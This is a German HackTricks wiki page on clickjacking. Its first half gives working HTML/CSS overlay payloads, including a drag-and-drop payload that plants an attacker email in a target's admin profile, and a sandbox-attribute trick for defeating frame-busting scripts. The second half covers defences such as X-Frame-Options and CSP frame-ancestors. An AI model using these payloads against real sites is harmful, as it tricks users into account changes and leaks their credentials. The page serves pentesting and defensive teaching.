# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Was ist Clickjacking

Bei einem Clickjacking-Angriff wird ein **Benutzer** dazu **getäuscht**, auf ein **Element** einer Webseite zu **klicken**, das entweder **unsichtbar** ist oder als ein anderes Element getarnt ist. Diese Manipulation kann für den Benutzer unbeabsichtigte Folgen haben, wie z. B. das Herunterladen von Malware, Weiterleitung zu bösartigen Webseiten, Herausgabe von Zugangsdaten oder sensiblen Informationen, Geldtransfers oder den Online-Kauf von Produkten.

### Prepopulate forms trick

Manchmal ist es möglich, **die Werte von Feldern eines Formulars beim Laden einer Seite mithilfe von GET-Parametern zu füllen**. Ein Angreifer kann dieses Verhalten ausnutzen, um ein Formular mit beliebigen Daten zu befüllen und die Clickjacking-Payload zu senden, sodass der Benutzer den Button Submit drückt.

### Populate form with Drag\&Drop

Wenn Sie möchten, dass der **Benutzer** **ein Formular ausfüllt**, aber ihn nicht direkt bitten wollen, bestimmte Informationen einzugeben (wie die E-Mail-Adresse oder ein bestimmtes Passwort, das Sie kennen), können Sie ihn einfach bitten, etwas per **Drag\&Drop** zu verschieben, das Ihre kontrollierten Daten einträgt, wie in [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Mehrstufige Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Wenn du eine **XSS attack that requires a user to click** auf ein Element identifiziert hast, um die XSS zu **triggern**, und die Seite für **Clickjacking** verwundbar ist, kannst du dies ausnutzen, um den Benutzer dazu zu bringen, auf den Button/Link zu klicken.\
Beispiel:\
Du hast eine **self XSS** in einigen privaten Kontodaten gefunden (Details, die **nur du setzen und lesen kannst**). Die Seite mit dem **Formular**, um diese Details zu setzen, ist **verwundbar** für **Clickjacking** und du kannst das **Formular** mit GET-Parametern **prepopulate**.\
Ein Angreifer könnte einen **Clickjacking**-Angriff auf diese Seite vorbereiten, das **Formular** mit der **XSS payload** **prepopulating** und den **Benutzer** dazu **tricken**, auf **Submit** zu klicken. Wenn das Formular abgesendet wird und die Werte verändert sind, **führt der Benutzer die XSS aus**.


### DoubleClickjacking

Zuerst [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html) erklärt, würde diese Technik das Opfer auffordern, auf einen Button einer kontrollierten Seite doppelt zu klicken, der an einer bestimmten Position platziert ist, und die Zeitdifferenzen zwischen mousedown und onclick Events ausnutzen, um während des Doppelklicks die Opferseite zu laden, sodass das **Opfer tatsächlich einen legitimen Button auf der Opferseite klickt**.

Ein Beispiel ist in diesem Video zu sehen: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

Ein Codebeispiel findet sich auf [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Diese Technik ermöglicht es, den Benutzer dazu zu bringen, an einer Stelle auf der Opferseite zu klicken und damit alle Schutzmechanismen gegen Clickjacking zu umgehen. Der Angreifer muss also **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions** finden.

### Browser-Erweiterungen: DOM-based autofill clickjacking

Abgesehen davon, Opferseiten in iframes einzubetten, können Angreifer UI-Elemente von Browser-Erweiterungen angreifen, die in die Seite injiziert werden. Passwort-Manager rendern autofill dropdowns in der Nähe fokussierter Eingabefelder; indem ein vom Angreifer kontrolliertes Feld fokussiert und das Dropdown der Erweiterung verborgen/verdeckt wird (opacity/overlay/top-layer Tricks), kann ein erzwungener Benutzerklick ein gespeichertes Element auswählen und sensible Daten in vom Angreifer kontrollierte Eingaben einfüllen. Diese Variante benötigt keine iframe-Exposition und funktioniert vollständig über DOM/CSS-Manipulation.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Clientseitig ausgeführte Skripte können Maßnahmen ergreifen, um Clickjacking zu verhindern:

- Sicherstellen, dass das Anwendungsfenster das Haupt- oder Top-Fenster ist.
- Alle Frames sichtbar machen.
- Klicks auf unsichtbare Frames verhindern.
- Erkennen und Warnen der Benutzer bei möglichen Clickjacking-Versuchen.

Diese frame-busting Skripte können jedoch umgangen werden:

- **Sicherheitseinstellungen der Browser:** Manche Browser könnten diese Skripte basierend auf ihren Sicherheitseinstellungen oder fehlender JavaScript-Unterstützung blockieren.
- **HTML5 iframe sandbox Attribute:** Ein Angreifer kann frame buster Skripte neutralisieren, indem er das sandbox-Attribut mit den Werten allow-forms oder allow-scripts setzt, jedoch ohne allow-top-navigation. Das verhindert, dass das iframe verifiziert, ob es das Top-Fenster ist, z. B.
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Die Werte allow-forms und allow-scripts erlauben Aktionen innerhalb des <iframe>, während die Navigation auf oberster Ebene deaktiviert wird. Um die gewünschte Funktionalität der Zielseite sicherzustellen, können je nach Angriffstyp zusätzliche Berechtigungen wie allow-same-origin und allow-modals erforderlich sein. Meldungen in der Browser-Konsole können Hinweise darauf geben, welche Berechtigungen zu erlauben sind.

### Server-seitige Abwehrmaßnahmen

#### X-Frame-Options

Der **X-Frame-Options HTTP response header** informiert Browser darüber, ob das Rendern einer Seite in einem <frame> oder <iframe> legitim ist und hilft, Clickjacking zu verhindern:

- X-Frame-Options: deny - Keine Domain kann den Inhalt einbetten.
- X-Frame-Options: sameorigin - Nur die aktuelle Site kann den Inhalt einbetten.
- X-Frame-Options: allow-from https://trusted.com - Nur die angegebene 'uri' kann die Seite einbetten.
- Beachte die Einschränkungen: Wenn der Browser diese Direktive nicht unterstützt, wirkt sie möglicherweise nicht. Einige Browser bevorzugen die CSP frame-ancestors directive.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** ist die empfohlene Methode zum Schutz gegen Clickjacking:

- frame-ancestors 'none' - Ähnlich wie X-Frame-Options: deny.
- frame-ancestors 'self' - Ähnlich wie X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Ähnlich wie X-Frame-Options: allow-from.

Beispielsweise erlaubt die folgende CSP das Einbetten nur von derselben Domain:

Content-Security-Policy: frame-ancestors 'self';

Weitere Details und komplexe Beispiele finden sich in der [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) und [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) mit child-src und frame-src

**Content Security Policy (CSP)** ist eine Sicherheitsmaßnahme, die hilft, Clickjacking und andere code injection attacks zu verhindern, indem sie angibt, welche Quellen der Browser zum Laden von Inhalten zulassen soll.

#### frame-src Directive

- Definiert gültige Quellen für Frames.
- Spezifischer als die default-src directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames von derselben Herkunft (self) und https://trusted-website.com.

#### child-src Direktive

- Eingeführt in CSP Level 2, um gültige Quellen für web workers und frames festzulegen.
- Dient als Fallback für frame-src und worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames und Workers von derselben Origin (self) und https://trusted-website.com.

**Hinweise zur Verwendung:**

- Abkündigung: child-src wird zugunsten von frame-src und worker-src schrittweise eingestellt.
- Fallback-Verhalten: Wenn frame-src fehlt, wird child-src als Fallback für Frames verwendet. Wenn beide fehlen, wird default-src verwendet.
- Strikte Quellendefinition: Nur vertrauenswürdige Quellen in die Direktiven aufnehmen, um Ausnutzung zu verhindern.

#### JavaScript Frame-Breaking Scripts

Obwohl sie nicht völlig narrensicher sind, können JavaScript-basierte frame-busting Skripte verwendet werden, um zu verhindern, dass eine Webseite in einem Frame angezeigt wird. Beispiel:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Einsatz von Anti-CSRF Tokens

- **Token-Validierung:** Verwenden Sie anti-CSRF tokens in Webanwendungen, um sicherzustellen, dass zustandsändernde Anfragen bewusst vom Benutzer ausgelöst werden und nicht über eine Clickjacked-Seite erfolgen.

## Referenzen

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
